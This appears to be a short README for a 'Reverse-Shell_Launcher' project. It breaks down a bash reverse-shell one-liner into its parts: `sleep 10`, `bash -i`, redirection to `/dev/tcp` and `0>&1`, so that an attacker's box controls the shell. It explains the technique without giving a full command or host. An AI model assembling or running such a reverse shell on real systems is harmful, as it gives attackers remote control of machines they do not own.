# Reverse-Shell_Launcher

<h3>Breakdown</h3>

though a very short 1 liner, I still will break this down as best as I can

The use of `sleep 10` is used to for waiting until networking service is available before doing anything. 

Bash is able to write to a TCP socket in some linux environments, so `bash -i` is used to start an interactive bash session 

From here, I am redirecting standard out and standard error to the TCP socket with: `>& /dev/tcp` 

Finally I will direct Standard Input to the TCP socket. This makes sure that the attacker input comes from the attacker box, going through the TCP connection established. The file descriptor for stdin is `0` and it's redirected to the same location as stdout and stderr with `0>&1`
